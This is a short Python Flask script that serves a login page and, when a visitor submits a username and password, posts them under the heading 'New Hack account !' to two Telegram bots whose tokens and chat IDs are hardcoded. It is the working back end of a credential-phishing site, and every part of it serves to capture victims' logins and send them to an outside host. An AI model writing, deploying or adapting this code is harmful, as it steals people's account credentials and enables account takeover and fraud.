import requests as req
from flask import request,Flask,render_template
app = Flask(__name__)
@app.route("/",methods=['GET','POST'])
def post_add():
    global users,admain
    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        payload = (f"""
        New Hack account !
        username : {username}
        password : {password}
        """)
        s1 = "1699189666:AAGB6BbfZuYSwG6eblvy7LzM_QhxhO8dcis"
        ids = "788641831"
        url = f"https://api.telegram.org/bot{s1}/SendMessage?chat_id={ids}&text={payload}"
        r = req.post(url)
        s2 = "1654455694:AAGRO6IjRpHsR-wldJndTu4p7OF650742KY"
        ids2 = "1660183234"
        url_2 = f"https://api.telegram.org/bot{s2}/SendMessage?chat_id={ids2}&text={payload}"
        r2 = req.post(url_2)
        return render_template("index.html")
    elif request.method == "GET":
        return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000)